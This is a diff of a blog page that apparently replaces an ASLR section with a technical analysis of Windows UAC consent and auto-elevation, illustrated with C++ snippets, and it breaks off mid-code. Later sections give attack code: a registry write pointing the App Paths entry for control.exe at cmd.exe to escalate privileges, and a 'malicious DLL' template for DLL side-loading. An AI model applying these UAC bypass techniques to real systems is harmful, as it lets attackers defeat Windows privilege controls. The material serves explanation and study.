-<h4 class="wp-block-heading">1. <strong>Address Space Layout Randomization (ASLR)</strong></h4>
+<p class="wp-block-paragraph">int main() {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Initialize variables</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;RPC_STATUS status;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;RPC_WSTR stringBinding = NULL;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;RPC_BINDING_HANDLE bindingHandle = NULL;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Create a string binding handle</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;status = RpcStringBindingCompose(</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL, // UUID</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(RPC_WSTR)L&#8221;ncacn_ip_tcp&#8221;, // Protocol sequence</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL, // Network address</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(RPC_WSTR)L&#8221;4747&#8243;, // Endpoint</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL, // Options</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;stringBinding);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;if (status) {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;std::cerr &lt;&lt; &#8220;RpcStringBindingCompose failed&#8221; &lt;&lt; std::endl;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(status);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;}</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Create a binding handle from the string binding handle</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;status = RpcBindingFromStringBinding(stringBinding, &amp;bindingHandle);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;if (status) {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;std::cerr &lt;&lt; &#8220;RpcBindingFromStringBinding failed&#8221; &lt;&lt; std::endl;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RpcStringFree(&amp;stringBinding);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(status);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;}</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Free the string binding handle</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;RpcStringFree(&amp;stringBinding);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Here you would typically perform RPC communication, such as invoking</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// I_RpcBindingInqLocalClientPID and other related functions.</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// For demonstration, we&#8217;ll just print a message</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;std::cout &lt;&lt; &#8220;RPC communication would be performed here.&#8221; &lt;&lt; std::endl;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Clean up the binding handle</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;RpcBindingFree(&amp;bindingHandle);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;return 0;</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Handling Process Creation Parameters</strong></p>
+
+
+
+<p class="wp-block-paragraph">The function handles two critical parameters for process creation: the program path and the command string. If the program path is not provided, the command string is used as the target. The CreateFileW API is then invoked to obtain a file handle for the executable.</p>
+
+
+
+<p class="wp-block-paragraph">Creating a C++ example that demonstrates handling process creation parameters, specifically dealing with the program path and command string, can be done using Windows API functions. The example will show how to conditionally handle the program path and command string, and then use the CreateFileW API to obtain a file handle for the executable.</p>
+
+
+
+<p class="wp-block-paragraph">#include &lt;windows.h&gt;</p>
+
+
+
+<p class="wp-block-paragraph">#include &lt;iostream&gt;</p>
+
+
+
+<p class="wp-block-paragraph">#include &lt;string&gt;</p>
+
+
+
+<p class="wp-block-paragraph">int main() {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Example program path and command string</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;std::wstring programPath = L&#8221;C:\\Path\\To\\Executable.exe&#8221;;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;std::wstring commandString = L&#8221;\&#8221;C:\\Path\\To\\Executable.exe\&#8221; -arg1 -arg2&#8243;;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Determine the target based on whether the program path is provided</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;std::wstring target;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;if (!programPath.empty()) {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;target = programPath;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;} else {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// If the program path is not provided, use the command string</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;target = commandString;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;}</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Use CreateFileW to obtain a file handle for the executable</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;HANDLE fileHandle = CreateFileW(</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;target.c_str(), &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // File name</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GENERIC_READ, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Desired access</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FILE_SHARE_READ,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Share mode</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Security attributes</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OPEN_EXISTING,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Creation disposition</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FILE_ATTRIBUTE_NORMAL,&nbsp; &nbsp; &nbsp; // Flags and attributes</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL);&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Template file</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;if (fileHandle == INVALID_HANDLE_VALUE) {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;std::cerr &lt;&lt; &#8220;Failed to open file: &#8221; &lt;&lt; GetLastError() &lt;&lt; std::endl;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 1;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;} else {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;std::cout &lt;&lt; &#8220;File opened successfully.&#8221; &lt;&lt; std::endl;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;}</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Perform operations with the file handle as needed&#8230;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Close the file handle</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(fileHandle);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;return 0;</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<p class="wp-block-paragraph">In this example:</p>
 
 
 
 <ul class="wp-block-list">
-<li><strong>Purpose</strong>: Randomizes memory addresses to make exploitation harder.</li>
+<li>We define a programPath and a commandString. The programPath is the direct path to the executable, while the commandString could include the path along with additional arguments.</li>
 
 
 
-<li><strong>ROP Bypass</strong>:
+<li>The code then checks if programPath is provided. If it is, programPath is used as the target; otherwise, commandString is used.</li>
+
+
+
+<li>CreateFileW is used to open the file (executable in this case). The function returns a handle to the opened file.</li>
+
+
+
+<li>Error handling is included to check if the file handle is valid.</li>
+
+
+
+<li>Finally, the file handle is closed using CloseHandle.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><strong>UAC Elevation Control</strong></p>
+
+
+
+<p class="wp-block-paragraph">The function also interacts with the Windows API to retrieve the user-configured notification settings for UAC elevation, ranging from no notifications to maximum strictness.</p>
+
+
+
+<h1 class="wp-block-heading" id="h-consentui">ConsentUI</h1>
+
+
+
+<p class="wp-block-paragraph">User Account Control (UAC) in Windows plays a pivotal role in maintaining system security by managing privilege elevation requests. A critical component of this architecture is the UAC interface program, particularly the ConsentUI callback and the AiLaunchConsentUI function. This article provides a deep technical analysis of these components, exploring their operation and significance in the UAC process.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="1065" height="894" src="/wp-content/uploads/2023/11/image-19.png" alt="" class="wp-image-8104" srcset="/wp-content/uploads/2023/11/image-19.png 1065w, /wp-content/uploads/2023/11/image-19-300x252.png 300w, /wp-content/uploads/2023/11/image-19-1024x860.png 1024w, /wp-content/uploads/2023/11/image-19-768x645.png 768w" sizes="(max-width: 1065px) 100vw, 1065px" /></figure>
+
+
+
+<p class="wp-block-paragraph"><strong>Understanding AiLaunchConsentUI and ConsentUI</strong></p>
+
+
+
+<p class="wp-block-paragraph">The AiLaunchConsentUI function is responsible for initiating the UAC consent interface, typically consent.exe, which prompts the user to approve or deny privilege elevation requests. This process involves several key steps:</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="1344" height="1037" src="/wp-content/uploads/2023/11/image-21.png" alt="" class="wp-image-8106" srcset="/wp-content/uploads/2023/11/image-21.png 1344w, /wp-content/uploads/2023/11/image-21-300x231.png 300w, /wp-content/uploads/2023/11/image-21-1024x790.png 1024w, /wp-content/uploads/2023/11/image-21-768x593.png 768w" sizes="(max-width: 1344px) 100vw, 1344px" /></figure>
+
+
+
+<p class="wp-block-paragraph">Launching Consent.exe: The AiLaunchConsentUI function starts consent.exe in a suspended state.</p>
+
+
+
+<p class="wp-block-paragraph">Verification with AipVerifyConsent: Before resuming consent.exe, the AipVerifyConsent function checks if it has been hijacked, ensuring its authenticity.</p>
+
+
+
+<p class="wp-block-paragraph">Resuming and Awaiting Consent.exe: The process is resumed with ResumeThread, and the function waits for consent.exe to return an exit code.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Authentication and Exit Codes</strong></p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="1312" height="1110" src="/wp-content/uploads/2023/11/image-16.png" alt="" class="wp-image-8101" srcset="/wp-content/uploads/2023/11/image-16.png 1312w, /wp-content/uploads/2023/11/image-16-300x254.png 300w, /wp-content/uploads/2023/11/image-16-1024x866.png 1024w, /wp-content/uploads/2023/11/image-16-768x650.png 768w" sizes="(max-width: 1312px) 100vw, 1312px" /></figure>
+
+
+
+<p class="wp-block-paragraph">Authentication A and B: These are preliminary checks that refresh the trustedFlag, which is passed to consent.exe. The status of these authentications influences the behavior of the consent interface.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="1405" height="1209" src="/wp-content/uploads/2023/11/image-12.png" alt="" class="wp-image-8097" srcset="/wp-content/uploads/2023/11/image-12.png 1405w, /wp-content/uploads/2023/11/image-12-300x258.png 300w, /wp-content/uploads/2023/11/image-12-1024x881.png 1024w, /wp-content/uploads/2023/11/image-12-768x661.png 768w" sizes="(max-width: 1405px) 100vw, 1405px" /></figure>
+
+
+
+<p class="wp-block-paragraph">User Response Handling: If the user approves the elevation, consent.exe returns an exit code of 0. If denied or closed, it returns 0x4C7.</p>
+
+
+
+<p class="wp-block-paragraph">Handling Special Exit Codes: In some cases, specific exit codes like 0x102 or 0x42B result in AiLaunchConsentUI returning 0x4C7, indicating a denial of privilege elevation.</p>
+
+
+
+<p class="wp-block-paragraph">#include &lt;windows.h&gt;</p>
+
+
+
+<p class="wp-block-paragraph">#include &lt;iostream&gt;</p>
+
+
+
+<p class="wp-block-paragraph">// Hypothetical function to simulate AiLaunchConsentUI</p>
+
+
+
+<p class="wp-block-paragraph">DWORD SimulateAiLaunchConsentUI(bool trustedFlag) {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Simulate user response and special cases</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;if (trustedFlag) {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Simulate user approving the elevation</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 0; // Exit code for approval</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;} else {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Simulate user denying the elevation or special exit codes</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Replace with actual logic to determine specific exit codes</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 0x4C7; // Exit code for denial</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;}</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<p class="wp-block-paragraph">int main() {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Simulated authentication checks (Authentication A and B)</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;bool authenticationAPassed = true; // Replace with actual authentication logic</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;bool authenticationBPassed = true; // Replace with actual authentication logic</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Determine the trustedFlag based on authentication results</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;bool trustedFlag = authenticationAPassed &amp;&amp; authenticationBPassed;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Call the hypothetical AiLaunchConsentUI function</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;DWORD exitCode = SimulateAiLaunchConsentUI(trustedFlag);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Handle the exit code</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;switch (exitCode) {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case 0:</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;std::cout &lt;&lt; &#8220;Privilege elevation approved.&#8221; &lt;&lt; std::endl;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case 0x4C7:</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;std::cout &lt;&lt; &#8220;Privilege elevation denied.&#8221; &lt;&lt; std::endl;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;default:</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;std::cout &lt;&lt; &#8220;Unexpected exit code: &#8221; &lt;&lt; exitCode &lt;&lt; std::endl;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;}</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;return 0;</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<p class="wp-block-paragraph">In this example:</p>
+
+
+
+<p class="wp-block-paragraph">We simulate the AiLaunchConsentUI function with SimulateAiLaunchConsentUI, which takes a trustedFlag as a parameter.</p>
+
+
+
+<p class="wp-block-paragraph">The trustedFlag is determined based on the results of two hypothetical authentication checks (Authentication A and B).</p>
+
+
+
+<p class="wp-block-paragraph">The SimulateAiLaunchConsentUI function returns an exit code based on the trustedFlag. In a real scenario, this would be the result of user interaction with the UAC prompt.</p>
+
+
+
+<p class="wp-block-paragraph">The main function interprets the exit code to determine if privilege elevation was approved or denied.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Two-Level Trust Privilege Authentication</strong></p>
+
+
+
+<p class="wp-block-paragraph">The UAC employs a two-level trust privilege authentication system (Authentication A and B). If both levels are passed, consent.exe may not display the authorization window, automatically setting the ExitCode to 0 and approving the elevation request. This mechanism reduces user disruption for trusted processes.</p>
+
+
+
+<h1 class="wp-block-heading" id="h-elevated-privilege-conditions">Elevated Privilege Conditions</h1>
+
+
+
+<p class="wp-block-paragraph">This article delves into the conditions for automatic privilege elevation in the User Account Control (UAC) design and explores potential exploitation streams, supported by technical analysis and code examples in C++ and PowerShell.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Conditions for Automatic Privilege Elevation</strong></p>
+
+
+
+<p class="wp-block-paragraph">The UAC in Windows 10 has specific conditions that allow for automatic privilege elevation:</p>
+
+
+
+<p class="wp-block-paragraph">Auto Elevation Configuration: The program must be configured for auto elevation.</p>
+
+
+
+<p class="wp-block-paragraph">Valid Digital Signature: The program should possess a valid digital signature.</p>
+
+
+
+<p class="wp-block-paragraph">Trusted System Directory: Execution must originate from a trusted system directory.</p>
+
+
+
+<p class="wp-block-paragraph">These conditions are designed to smooth user experience by reducing frequent authorization requests for trusted services and tools.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Potential Exploitation Streams</strong></p>
+
+
+
+<p class="wp-block-paragraph">However, these conditions also open avenues for exploitation:</p>
+
+
+
+<p class="wp-block-paragraph">Improper Registry Configuration: As demonstrated by Matt Nelson in his blog post &#8220;Bypassing UAC Using App Paths,&#8221; manipulating registry keys can lead to privilege escalation.</p>
+
+
+
+<p class="wp-block-paragraph">Public COM Interface Exploitation: Privileged services with public COM interfaces can be exploited if they lack robust authentication.</p>
+
+
+
+<p class="wp-block-paragraph">Direct Attacks on UAC Trust Authentication: Insufficiently robust UAC privilege service verification processes can be directly attacked.</p>
+
+
+
+<p class="wp-block-paragraph">C++ Example: Simulating Registry Manipulation for Privilege Escalation</p>
+
+
+
+<p class="wp-block-paragraph">#include &lt;windows.h&gt;</p>
+
+
+
+<p class="wp-block-paragraph">#include &lt;iostream&gt;</p>
+
+
+
+<p class="wp-block-paragraph">int main() {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;HKEY hKey;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;LONG result;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Open the registry key with write access</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;result = RegOpenKeyEx(HKEY_CURRENT_USER,&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TEXT(&#8220;Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe&#8221;),&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KEY_WRITE,&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;hKey);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;if (result == ERROR_SUCCESS) {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Set the new command</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;const char* newCommand = &#8220;C:\\Windows\\System32\\cmd.exe&#8221;;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result = RegSetValueEx(hKey, &#8220;&#8221;, 0, REG_SZ, (BYTE*)newCommand, strlen(newCommand) + 1);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (result == ERROR_SUCCESS) {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;std::cout &lt;&lt; &#8220;Registry key modified successfully.&#8221; &lt;&lt; std::endl;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;std::cerr &lt;&lt; &#8220;Failed to modify registry key.&#8221; &lt;&lt; std::endl;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RegCloseKey(hKey);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;} else {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;std::cerr &lt;&lt; &#8220;Failed to open registry key.&#8221; &lt;&lt; std::endl;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;}</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;return 0;</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<h1 class="wp-block-heading" id="h-bypass-uac-with-dll-side-loading">Bypass UAC with DLL side-loading</h1>
+
+
+
+<p class="wp-block-paragraph">DLL side-loading is a technique where a malicious DLL is placed in the same directory as a high-privilege system program, leading to the execution of the malicious code with elevated privileges.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Challenges</strong></p>
+
+
+
+<p class="wp-block-paragraph">System programs that automatically gain privileges are typically located in protected directories like C:\Windows\System32 or C:\Windows\SysWOW64.</p>
+
+
+
+<p class="wp-block-paragraph">Writing to these directories requires high-privilege access, which is not usually available.</p>
+
+
+
+<p class="wp-block-paragraph">Exploitation Example</p>
+
+
+
+<p class="wp-block-paragraph">Despite these challenges, it&#8217;s possible to exploit this technique by leveraging a high-privilege service. For instance, the File Explorer (explorer.exe) can write to privileged directories without UAC privilege trust authentication.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>C++ Code Example: Creating a Malicious DLL</strong></p>
+
+
+
+<p class="wp-block-paragraph">#include &lt;windows.h&gt;</p>
+
+
+
+<p class="wp-block-paragraph">BOOL APIENTRY DllMain(HMODULE hModule, DWORD&nbsp; ul_reason_for_call, LPVOID lpReserved) {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;switch (ul_reason_for_call) {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;case DLL_PROCESS_ATTACH:</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MessageBox(NULL, &#8220;Malicious code executed!&#8221;, &#8220;DLL Side-Loading&#8221;, MB_OK);</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</p>
+
+
+
